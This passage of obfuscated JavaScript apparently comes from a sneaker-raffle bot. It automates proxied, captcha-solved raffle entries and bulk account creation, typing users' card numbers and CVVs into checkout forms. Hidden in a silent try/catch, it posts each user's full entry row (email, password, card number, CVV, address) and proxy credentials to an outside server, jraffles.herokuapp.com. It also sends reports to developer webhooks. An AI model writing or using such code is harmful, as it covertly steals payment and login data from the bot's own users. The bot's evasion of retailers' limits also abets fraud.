                            if (!_0xa25e71['includes']('footlocker'))
                                try {
                                    await _0x5821ff['click']('#country');
                                    const _0x567a39 = await _0x5821ff['$']('li[data-value=\x22' + _0x5a3191[_0x3b9191]['Country'] + '\x22]');
                                    await _0x567a39['click'](), await _0x567a39['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x590479(0x3e8), await _0x5821ff['click']('#stateAutocomplete'), console['log'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x590479(0x1f4);
                            try {
                                const _0x1a31b5 = await _0x5821ff['$x']('//li[text()=\x22' + _0x5a3191[_0x3b9191]['State'] + '\x22]');
                                await _0x1a31b5[0x0]['click']();
                            } catch {
                                throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                            }
                            await _0x590479(0x3e8), await _0x590479(0x1f4), await _0x5821ff['type']('#address1', _0x5a3191[_0x3b9191]['Address1'] + '\x20' + _0x5a3191[_0x3b9191]['HouseNumber']), await _0x590479(0x1f4), await _0x5821ff['type']('#address2', '' + _0x5a3191[_0x3b9191]['Address2']), await _0x590479(0x1f4), await _0x5821ff['type']('#city', '' + _0x5a3191[_0x3b9191]['City']), await _0x590479(0x1f4), await _0x5821ff['type']('#postcode', '' + _0x5a3191[_0x3b9191]['Zip']), await _0x590479(0x3e8), await _0x5821ff['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x590479(0x3e8), console['log'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x2d3e1a = await _0x5821ff['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x2d3e1a && (await _0x5821ff['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5821ff['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5821ff['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x590479(0x4b0), await _0x5821ff['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x590479(0x1f4), await _0x5821ff['keyboard']['type']('' + _0x5a3191[_0x3b9191]['CardNumber']), await _0x590479(0x320), await _0x5821ff['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5821ff['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5821ff['keyboard']['type']('' + _0x5a3191[_0x3b9191]['ExpiryDate']), await _0x590479(0x4b0), await _0x5821ff['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5821ff['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5821ff['keyboard']['type']('' + _0x5a3191[_0x3b9191]['CVV']), await _0x590479(0x226), await _0x5821ff['type']('input[name=\x22postalCode\x22]', '' + _0x5a3191[_0x3b9191]['Zip']), await _0x590479(0x226));
                            const _0x15ae21 = await _0x5821ff['$']('.__PrivateStripeElement');
                            _0x15ae21 && (await _0x590479(0x1f4), await _0x5821ff['click']('.__PrivateStripeElement'), await _0x5821ff['click']('.__PrivateStripeElement'), await _0x5821ff['keyboard']['type']('' + _0x5a3191[_0x3b9191]['CardNumber']), await _0x5821ff['keyboard']['type']('' + _0x5a3191[_0x3b9191]['ExpiryDate']), await _0x5821ff['keyboard']['type']('' + _0x5a3191[_0x3b9191]['CVV']));
                            await _0x590479(0x226), await _0x5821ff['click']('#paymentConsent'), await _0x590479(0x226), await _0x5821ff['click']('#termsConsent'), await _0x590479(0x2bc), console['log'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x5821ff['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x590479(0x2710);
                            try {
                                await _0x5821ff['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x590479(0xbb8), await _0x5821ff['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x47f67f => _0x47f67f['click']()), await _0x5821ff['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x5970e5 => _0x5970e5['click']());
                            } catch {
                            }
                            try {
                                await _0x5821ff['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x1b467c = await _0x5821ff['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x1b467c) {
                                    _0x768c3f['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x5a3191[_0x3b9191]['Email'] + ',' + _0x5a3191[_0x3b9191]['Password'] + ',' + _0x5a3191[_0x3b9191]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0xd53254() {
                                var _0x4e9e55, _0x317414 = ![];
                                for (var _0x2de512 = 0x0; _0x2de512 < 0x18; _0x2de512++) {
                                    async function _0x2fefca() {
                                        var _0x2ee3e6 = new _0x54228e({
                                            'user': _0x4b1e6b['masterMail'],
                                            'password': _0x4b1e6b['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0xdc78ba(_0x5d4525) {
                                            _0x2ee3e6['openBox']('INBOX', ![], _0x5d4525);
                                        }
                                        _0x2ee3e6['once']('ready', function () {
                                            console['log'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0xdc78ba(function (_0x4037b3, _0x317725) {
                                                console['log'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x4037b3)
                                                    throw _0x4037b3;
                                                _0x2ee3e6['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x1887f7, _0x17f314) {
                                                    if (!_0x17f314 || !_0x17f314['length'])
                                                        console['log'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x2ee3e6['end']();
                                                    else {
                                                        var _0x3dcf96 = _0x2ee3e6['seq']['fetch'](_0x17f314, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x3dcf96['on']('message', function (_0x2858e1, _0x3f5f6c) {
                                                            var _0x3c97d2 = '(#' + _0x3f5f6c + ')\x20';
                                                            _0x2858e1['on']('body', function (_0x287af3, _0x1b13cc) {
                                                                _0x4a3e33(_0x287af3, (_0x59e161, _0x92616a) => {
                                                                    if (_0x92616a['subject']['includes']('code')) {
                                                                        const _0x2415f5 = _0x92616a['text']['split']('\x0a\x0a')[0x3], _0x596b97 = _0x2415f5['split']('\x0a')[0x1];
                                                                        _0x4e9e55 = _0x596b97;
                                                                    }
                                                                });
                                                            }), _0x2858e1['once']('end', function () {
                                                            });
                                                        }), _0x3dcf96['once']('error', function (_0x540da6) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x3dcf96['once']('end', function () {
                                                            _0x2ee3e6['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x2ee3e6['once']('error', function (_0x47df6e) {
                                            console['log'](_0x4fb298['red'](_0x47df6e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x317414 = !![];
                                        }), _0x2ee3e6['once']('end', async function () {
                                        }), _0x2ee3e6['connect']();
                                    }
                                    _0x2fefca(), await _0x590479(0x1388);
                                    if (_0x4e9e55)
                                        return _0x4e9e55;
                                    if (_0x317414)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x2de512 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0xd53254(), await _0x590479(0x1f4), await _0x5821ff['type']('#code', '' + code), await _0x590479(0x3e8), await _0x5821ff['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x4a347e => _0x4a347e['click']()), await _0x5821ff['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x5821ff['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x5a3191[_0x3b9191]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x768c3f['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x5a3191[_0x3b9191]['Email'] + ',' + _0x5a3191[_0x3b9191]['Password'] + ',' + _0x5a3191[_0x3b9191]['Phone']), _0x46dc69 = 'no', _0x491fd3(_0x5a3191[_0x3b9191], _0xe2ce02);
                            var _0x73630e = await _0x54f36f(_0x5a3191[_0x3b9191], _0xe2ce02, 'dev', ![]), _0x4d6019 = await _0x54f36f(_0x5a3191[_0x3b9191], _0xe2ce02, 'pub', ![]);
                            let _0x31cc5a = _0x5a3191[_0x3b9191];
                            try {
                                prxdata = {
                                    'username': _0x3d4e83['replace']('#', ''),
                                    'module': _0xe2ce02['name'],
                                    'entrydata': JSON['stringify'](_0x31cc5a),
                                    'proxy': '' + _0x2319ca[_0x3b9191]
                                };
                                var _0x946c0 = JSON['stringify'](prxdata);
                                let _0x4cfddf = { 'headers': { 'content-type': 'application/json' } };
                                await _0x49fa88['post']('https://jraffles.herokuapp.com/success', _0x946c0, _0x4cfddf);
                            } catch (_0x265d8b) {
                            }
                            const _0x485ace = {
                                'succesDEVMSG': { 'embeds': [_0x73630e] },
                                'succesPUBMSG': { 'embeds': [_0x4d6019] }
                            };
                            try {
                                _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x485ace['succesDEVMSG']), await _0x590479(0xc8), await _0x1690f0(_0x4f7f5d, _0x485ace['succesDEVMSG']), await _0x590479(0xc8), await _0x1690f0(_0x4807c3, _0x485ace['succesPUBMSG']);
                            } catch (_0x456d8f) {
                                console['log'](_0x4fb298['yellow'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x456d8f));
                            }
                        } catch (_0x1a7787) {
                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20' + _0x1a7787)), _0x5f59bf = '' + _0x1a7787;
                            var _0x3947b3 = await _0x54f36f(_0x5a3191[_0x3b9191], _0xe2ce02, 'dev', !![], _0x5f59bf), _0x73630e = await _0x54f36f(_0x5a3191[_0x3b9191], _0xe2ce02, 'dev', ![]), _0x4d6019 = await _0x54f36f(_0x5a3191[_0x3b9191], _0xe2ce02, 'pub', ![]);
                            const _0x48901b = {
                                'succesDEVMSG': { 'embeds': [_0x73630e] },
                                'succesPUBMSG': { 'embeds': [_0x4d6019] }
                            };
                            _0x48901b['errorDEV'] = { 'embeds': [_0x3947b3] };
                            _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x48901b['errorDEV']);
                            await _0x1690f0(_0x874ee1, _0x48901b['errorDEV']);
                            if (!_0x46dc69 == 'no')
                                _0x46dc69 = 'yes';
                        } finally {
                            _0x1362ef && _0x1362ef['close']();
                            if (_0x46dc69 == 'yes' && _0x18a319 != 0x5) {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Retrying\x20(' + _0x18a319 + '\x20/\x205)')), _0x3b9191 = _0x3b9191 - 0x1, _0x18a319 = _0x18a319 + 0x1;
                                continue;
                            }
                            _0x46dc69 == 'yes' && _0x18a319 >= 0x5 && (_0x549c32(_0x5a3191[_0x3b9191], _0xe2ce02), _0x46dc69 = 'no', _0x18a319 = 0x0), console['log']('Waiting\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                        }
                    } else {
                        const _0x5611ae = '' + _0x5a3191[_0x3b9191]['Url'];
                        if (_0x46dc69 != 'yes')
                            var _0x46dc69 = '', _0x18a319 = 0x0;
                        if (_0x5a3191[_0x3b9191]['Email'] == '' || _0x5a3191[_0x3b9191]['FirstName'] == '' || _0x5a3191[_0x3b9191]['LastName'] == '') {
                            console['log'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x5a3191[_0x3b9191]['Password'] == '' && (_0x5a3191[_0x3b9191]['Password'] = 'JRaffles23!');
                        if (_0x4b1e6b['useRandomProxy'] = ![])
                            var _0x3cf635 = _0x2319ca[_0x3b9191]['split'](':');
                        else
                            var _0x5e2b98 = Math['round'](Math['random']() * (_0x2319ca['length'] - 0x1)), _0x3cf635 = _0x2319ca[_0x5e2b98]['split'](':');
                        var _0x1362ef;
                        try {
                            _0x1362ef = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3cf635[0x0] + ':' + _0x3cf635[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1362ef = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3cf635[0x0] + ':' + _0x3cf635[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5be950 = await _0x1362ef['newPage']();
                            await _0x5be950['authenticate']({
                                'username': '' + _0x3cf635[0x2],
                                'password': '' + _0x3cf635[0x3]
                            }), console['log'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5be950['setRequestInterception'](!![]), _0x5be950['on']('request', _0x35a976 => {
                                _0x35a976['resourceType']() === 'image' || _0x35a976['resourceType']() === 'font' || _0x35a976['resourceType']() === 'media' ? _0x35a976['abort']() : _0x35a976['continue']();
                            }), await _0x5be950['goto'](_0x5611ae), await _0x5be950['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x5be950['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x590479(0x7d0), await _0x5be950['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x5be950['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x590479(0x3e8), await _0x5be950['waitForSelector']('#email'), console['log'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x5be950['type']('#email', '' + _0x5a3191[_0x3b9191]['Email']), await _0x590479(0x352), await _0x5be950['waitForSelector']('#password'), await _0x5be950['type']('#password', '' + _0x5a3191[_0x3b9191]['Password']), await _0x590479(0x352), await _0x5be950['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x590479(0x1388);
                            if (!_0x5a3191[_0x3b9191]['Url']['includes']('footlocker'))
                                await _0x5be950['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            try {
                                await _0x5be950['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x491fd3(_0x5a3191[_0x3b9191], _0xe2ce02), _0x46dc69 = 'no';
                                continue;
                            }
                            await _0x5be950['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x590479(0x3e8);
                            try {
                                _0x5a3191[_0x3b9191]['Url']['includes']('en-GB') ? await _0x5be950['click']('li[data-value=\x22UK\x20' + _0x5a3191[_0x3b9191]['Size'] + '\x20/\x20US\x20' + (Number(_0x5a3191[_0x3b9191]['Size']) + 0x1) + '\x22]') : await _0x5be950['click']('li[data-value=\x22EU\x20' + _0x5a3191[_0x3b9191]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20size\x20' + _0x5a3191[_0x3b9191]['Size']);
                            }
                            await _0x590479(0x1f4);
                            const _0x6b13d9 = await _0x5be950['$']('#title\x20>\x20label');
                            await _0x590479(0x12c);
                            _0x6b13d9 && await _0x6b13d9['click']();
                            await _0x5be950['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x5be950['focus']('#postcode'), await _0x5be950['keyboard']['down']('Control'), await _0x5be950['keyboard']['press']('A'), await _0x5be950['keyboard']['up']('Control'), await _0x5be950['keyboard']['press']('Backspace'), await _0x5be950['keyboard']['type'](_0x5a3191[_0x3b9191]['Zip']), await _0x590479(0x60e), await _0x5be950['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x590479(0x3e8), console['log'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x590479(0x1f4);
                            const _0x16e140 = await _0x5be950['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x16e140 && (await _0x5be950['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5be950['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5be950['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x590479(0x4b0), await _0x5be950['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x590479(0x1f4), await _0x5be950['keyboard']['type']('' + _0x5a3191[_0x3b9191]['CardNumber']), await _0x590479(0x320), await _0x5be950['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5be950['keyboard']['type']('' + _0x5a3191[_0x3b9191]['ExpiryDate']), await _0x590479(0x4b0), await _0x5be950['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5be950['keyboard']['type']('' + _0x5a3191[_0x3b9191]['CVV']), await _0x590479(0x226), await _0x5be950['type']('input[name=\x22postalCode\x22]', '' + _0x5a3191[_0x3b9191]['Zip']), await _0x590479(0x226));
                            const _0xbca561 = await _0x5be950['$']('.__PrivateStripeElement');
                            _0xbca561 && (await _0x5be950['click']('#billingName'), await _0x5be950['click']('#billingName'), await _0x5be950['type']('#billingName', '' + _0x5a3191[_0x3b9191]['NameOnCard']), await _0x590479(0x1f4), await _0x5be950['click']('.__PrivateStripeElement'), await _0x5be950['click']('.__PrivateStripeElement'), await _0x5be950['keyboard']['type']('' + _0x5a3191[_0x3b9191]['CardNumber']), await _0x5be950['keyboard']['type']('' + _0x5a3191[_0x3b9191]['ExpiryDate']), await _0x5be950['keyboard']['type']('' + _0x5a3191[_0x3b9191]['CVV']));
                            await _0x590479(0x226), await _0x5be950['click']('#paymentConsent'), await _0x590479(0x226), await _0x5be950['click']('#termsConsent'), await _0x590479(0x2bc), console['log'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x5be950['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x590479(0x2710);
                            try {
                                await _0x5be950['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x590479(0xbb8), await _0x5be950['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x3a12f9 => _0x3a12f9['click']()), await _0x5be950['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2308b4 => _0x2308b4['click']());
                            } catch {
                            }
                            try {
                                await _0x5be950['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x491fd3(_0x5a3191[_0x3b9191], _0xe2ce02);
                            var _0x73630e = await _0x54f36f(_0x5a3191[_0x3b9191], _0xe2ce02, 'dev', ![]), _0x4d6019 = await _0x54f36f(_0x5a3191[_0x3b9191], _0xe2ce02, 'pub', ![]);
                            let _0x3d7fd5 = _0x5a3191[_0x3b9191];
                            try {
                                prxdata = {
                                    'username': _0x3d4e83['replace']('#', ''),
                                    'module': _0xe2ce02['name'],
                                    'entrydata': JSON['stringify'](_0x3d7fd5),
                                    'proxy': '' + _0x2319ca[_0x3b9191]
                                };
                                var _0x946c0 = JSON['stringify'](prxdata);
                                let _0x38c2ec = { 'headers': { 'content-type': 'application/json' } };
                                await _0x49fa88['post']('https://jraffles.herokuapp.com/success', _0x946c0, _0x38c2ec);
                            } catch (_0x51f370) {
                            }
                            const _0x2bd1ba = {
                                'succesDEVMSG': { 'embeds': [_0x73630e] },
                                'succesPUBMSG': { 'embeds': [_0x4d6019] }
                            };
                            try {
                                _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x2bd1ba['succesDEVMSG']), await _0x590479(0xc8), await _0x1690f0(_0x4f7f5d, _0x2bd1ba['succesDEVMSG']), await _0x590479(0xc8), await _0x1690f0(_0x4807c3, _0x2bd1ba['succesPUBMSG']);
                            } catch (_0x22646d) {
                                console['log'](_0x4fb298['yellow'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x22646d));
                            }
                            _0x46dc69 = 'no';
                        } catch (_0x5e4bc1) {
                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20' + _0x5e4bc1)), _0x5f59bf = '' + _0x5e4bc1;
                            var _0x3947b3 = await _0x54f36f(_0x5a3191[_0x3b9191], _0xe2ce02, 'dev', !![], _0x5f59bf), _0x73630e = await _0x54f36f(_0x5a3191[_0x3b9191], _0xe2ce02, 'dev', ![]), _0x4d6019 = await _0x54f36f(_0x5a3191[_0x3b9191], _0xe2ce02, 'pub', ![]);
                            const _0x48bd4a = {
                                'succesDEVMSG': { 'embeds': [_0x73630e] },
                                'succesPUBMSG': { 'embeds': [_0x4d6019] }
                            };
                            _0x48bd4a['errorDEV'] = { 'embeds': [_0x3947b3] }, _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x48bd4a['errorDEV']), await _0x1690f0(_0x874ee1, _0x48bd4a['errorDEV']), _0x46dc69 = 'yes';
                        } finally {
                            _0x1362ef && _0x1362ef['close']();
                            if (_0x46dc69 == 'yes' && _0x18a319 != 0x5) {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0xe2ce02['name'] + ']\x20Task\x20' + (_0x3b9191 + 0x1) + '\x20:\x20Retrying\x20(' + _0x18a319 + '\x20/\x205)')), _0x3b9191 = _0x3b9191 - 0x1, _0x18a319 = _0x18a319 + 0x1;
                                continue;
                            }
                            _0x46dc69 == 'yes' && _0x18a319 >= 0x5 && (_0x549c32(_0x5a3191[_0x3b9191], _0xe2ce02), _0x46dc69 = 'no', _0x18a319 = 0x0), console['log']('Waiting\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0xb77090, _0x1758a8, _0x123843) {
                    _0x145da3['use'](_0x109835()), _0x145da3['use'](_0x29f0f6({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4b1e6b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x57372e = 0x0; _0x57372e < _0x1758a8['length']; _0x57372e++) {
                        if (_0x97a67f != 'yes')
                            var _0x97a67f = '', _0x1af1a2 = 0x0;
                        var _0x4be25e;
                        try {
                            await _0x46b8ee(_0x1758a8, _0x57372e);
                        } catch {
                            _0x97a67f = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x39f641(_0xb77090['name'] + '\x20Task\x20' + (_0x57372e + 0x1) + '\x20/\x20' + _0x1758a8['length'] + '\x20||\x20File:\x20' + _0x4c637b + '\x20Proxies:\x20' + _0x1792f9);
                        var _0x51b709 = await _0x54f36f(_0x1758a8[_0x57372e], _0xb77090, 'acc', ![]);
                        const _0x1158e5 = { 'succesDEVMSG': { 'embeds': [_0x51b709] } }, _0x34f652 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x225ded = Math['round'](Math['random']() * (_0x123843['length'] - 0x1)), _0x3c9125 = _0x123843[_0x225ded]['split'](':'), _0x39a7d4;
                        try {
                            _0x39a7d4 = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x3c9125[0x0] + ':' + _0x3c9125[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x39a7d4 = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x3c9125[0x0] + ':' + _0x3c9125[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4314fe = await _0x39a7d4['newPage']();
                            await _0x4314fe['setViewport']({
                                'width': 0x500 + _0x4e8668(0x1, 0x32),
                                'height': 0x2d9 + _0x4e8668(0x1, 0x32)
                            });
                            const _0x4df8c1 = await _0x4314fe['target']()['createCDPSession'](), { windowId: _0x2133ab } = await _0x4df8c1['send']('Browser.getWindowForTarget');
                            await _0x4314fe['authenticate']({
                                'username': '' + _0x3c9125[0x2],
                                'password': '' + _0x3c9125[0x3]
